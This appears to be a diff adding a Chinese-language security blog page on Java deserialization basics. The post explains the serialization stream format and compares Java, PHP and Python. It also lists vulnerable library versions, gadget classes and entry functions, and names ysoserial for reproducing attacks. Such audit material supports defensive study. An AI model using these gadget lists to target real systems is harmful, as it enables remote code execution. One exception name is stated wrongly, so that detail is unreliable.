@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Java反序列化基础 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="java反序列化基础">
+  <meta itemprop="datePublished" content="2024-08-15T10:15:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T10:15:01+08:00">
+  <meta itemprop="wordCount" content="402">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="java反序列化基础">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T10:15:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T10:15:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java反序列化基础">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "java反序列化基础",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/9\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  402 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/9\/","datePublished": "2024-08-15T10:15:01+08:00","dateModified": "2024-08-15T10:15:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Java反序列化基础</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Java反序列化基础</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 10:15:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="402 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="基础" class="heading-element"><span>0.0.0.1  基础</span>
+  <a href="#%e5%9f%ba%e7%a1%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="序列化和反序列化" class="heading-element"><span>0.0.0.1.1  序列化和反序列化</span>
+  <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e5%92%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>
+<p>序列化</p>
+<p>将一个类对象转换成为一段字节序列保存在文件中，和java的原生类==writeObject==对应</p>
+</li>
+<li>
+<p>反序列化</p>
+<p>将对象序列化生成的字节序列还原为一个对象，和java的原生类==readObject==对应</p>
+<p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p>
+</li>
+</ul>
+<h6 id="序列化条件" class="heading-element"><span>0.0.0.1.2  序列化条件</span>
+  <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e6%9d%a1%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>该类必须实现==java.io.Serializable== 对象</li>
+<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的</li>
+</ul>
+<h6 id="序列化过程" class="heading-element"><span>0.0.0.1.3  序列化过程</span>
+  <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%87%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>序列化：将 OutputStream 封装在 ObjectOutputStream 内，然后调用 writeObject 即可</li>
+<li>反序列化：将 InputStream 封装在 ObjectInputStream 内，然后调用 readObject 即可</li>
+</ul>
+<h6 id="反序列化出错可能原因" class="heading-element"><span>0.0.0.1.4  反序列化出错可能原因</span>
+  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%87%ba%e9%94%99%e5%8f%af%e8%83%bd%e5%8e%9f%e5%9b%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>序列化字节码中的 serialVersionUID(用于记录java序列化版本)在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException。</li>
+</ul>
+<h6 id="java-python-php-反序列化的比较" class="heading-element"><span>0.0.0.1.5  Java, Python, Php 反序列化的比较</span>
+  <a href="#java-python-php-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%af%94%e8%be%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### java和php</p>
+<blockquote>
+<p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p>
+<p>当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决的问题稍微有些差异。Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决**“<strong>反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决</strong>“**反序列化后如何初始化这个对象”的问题。</p>
+<p>我知道这样说会比较难理解，也几乎没有文章说到和理解到这个微小的差异，但这个设计理念可以说是决定为什么Java的反序列化漏洞这么多的根本原因</p>
+</blockquote>
+<p>PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 __sleep 、_wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p>
+<p>PHP的反序列化漏洞，很少是由__wakeup 这个方法触发的，通常触发在析构函数__destruct 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作。</p>
+<p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、 __sleep 很少使用是存在鲜明对比的。</p>
+<p>####### python</p>
+<p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险。</p>
+<p>从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>
+<h6 id="反序列化的可利用基础库" class="heading-element"><span>0.0.0.1.6  反序列化的可利用基础库</span>
+  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e5%8f%af%e5%88%a9%e7%94%a8%e5%9f%ba%e7%a1%80%e5%ba%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>危险库示例:
+commons-fileupload 1.3.1
+commons-io 2.4
+commons-collections 3.1
+commons-logging 1.2
+commons-beanutils 1.9.2
+org.slf4j:slf4j-api 1.7.21
+com.mchange:mchange-commons-java 0.2.11
+org.apache.commons:commons-collections 4.0
+com.mchange:c3p0 0.9.5.2
+org.beanshell:bsh 2.0b5
+org.codehaus.groovy:groovy 2.3.9
+org.springframework:spring-aop 4.1.4.RELEASE
+ 
+可能利用到的危险类:
+&#39;org.apache.commons.collections.functors.InvokerTransformer&#39;,
+&#39;org.apache.commons.collections.functors.InstantiateTransformer&#39;,
+&#39;org.apache.commons.collections4.functors.InvokerTransformer&#39;,
+&#39;org.apache.commons.collections4.functors.InstantiateTransformer&#39;,
+&#39;org.codehaus.groovy.runtime.ConvertedClosure&#39;,
+&#39;org.codehaus.groovy.runtime.MethodClosure&#39;,
+&#39;org.springframework.beans.factory.ObjectFactory&#39;,
+&#39;xalan.internal.xsltc.trax.TemplatesImpl&#39;
+&#39;org.apache.commons.fileupload&#39;
+&#39;org.apache.commons.beanutils&#39;</code></pre><p>若包含危险库，则使用ysoserial进行攻击复现。</p>
+<h6 id="反序列化入口函数" class="heading-element"><span>0.0.0.1.7  反序列化入口函数</span>
+  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e5%8f%a3%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>类名.方法名
+ObjectInputStream.readObject
+ObjectInputStream.readUnshared
+XMLDecoder.readObject
+Yaml.load
+XStream.fromXML
+ObjectMapper.readValue
+JSON.parseObject</code></pre><h6 id="序列化序列分析" class="heading-element"><span>0.0.0.1.8  序列化序列分析</span>
+  <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e5%ba%8f%e5%88%97%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>AC ED 00 05是常见的序列化数据开始，
+但有些应用程序在整个运行周期中保持与服务器的网络连接，
+如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。
+所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407301731732.webp" alt="image-20240730173125610" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407301731732.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407301731732.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407301731732.webp?size=large 2x" data-title="image-20240730173125610" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<pre tabindex="0"><code>Java类名称可能会以“L”开头的替代格式出现 ，以&#39;;&#39;结尾 ，
+并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。
+除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，
+例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的&#39;sr&#39;或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的&#39;xp&#39;。
+ 
+识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表：
+0x70 - TC_NULL
+0x71 - TC_REFERENCE
+0x72 - TC_CLASSDESC
+0x73 - TC_OBJECT
+0x74 - TC_STRING
+0x75 - TC_ARRAY
+0x76 - TC_CLASS
+0x7B - TC_EXCEPTION
+0x7C - TC_LONGSTRING
+0x7D - TC_PROXYCLASSDESC
+0x7E - TC_ENUM</code></pre><p><code>AC ED 00 05</code>之后可能跟上述的数据类型说明符，也可能跟<code>77(TC_BLOCKDATA元素)</code>或<code>7A(TC_BLOCKDATALONG元素)</code>其后跟的是块数据。</p>
+<p>序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。</p>
+<pre tabindex="0"><code>数据信息类型可能出现以下几种
+- 0xac ed STREAM_VERSION 
+- 0x00 05 Contents TC_BLOCKDATA 
+- 0x77 Length - 8 
+- 0x08 Contents 
+- 0xaf743f8c1d120cb9 TC_STRING 
+- 0x74 newHandle 0x00 7e 00 00 Length - 4 
+- 0x00 04 Value - ABCD - 0x41424344</code></pre><p><strong>SerializationDumper</strong> : <a href="https://github.com/NickstaDB/SerializationDumper"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/NickstaDB/SerializationDumper</a>
+可以分析序列化后的的十六进制数据</p>
